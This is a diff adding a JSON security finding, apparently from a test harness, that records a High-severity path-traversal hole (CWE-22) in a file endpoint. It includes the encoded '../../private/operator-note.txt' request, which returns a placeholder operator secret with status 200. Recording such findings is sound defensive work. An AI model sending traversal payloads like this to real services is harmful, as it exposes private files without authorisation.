@@ -1,0 +1,24 @@
+{
+  "id": "07-traversal-private",
+  "title": "Path traversal: служебный секрет",
+  "endpoint": "GET /files?user=alice&path=../../private/operator-note.txt",
+  "expected": "403/404 для приватного каталога",
+  "actual": "status=200, body={'content': 'TEST_ONLY_OPERATOR_SECRET'}",
+  "severity": "High",
+  "cwe": "CWE-22",
+  "owasp_llm": "-",
+  "request": {
+    "method": "GET",
+    "path": "/files?user=alice&path=..%2F..%2Fprivate%2Foperator-note.txt",
+    "body": null,
+    "headers": {
+      "X-Token": "<token>"
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "content": "TEST_ONLY_OPERATOR_SECRET"
+    }
+  }
+}
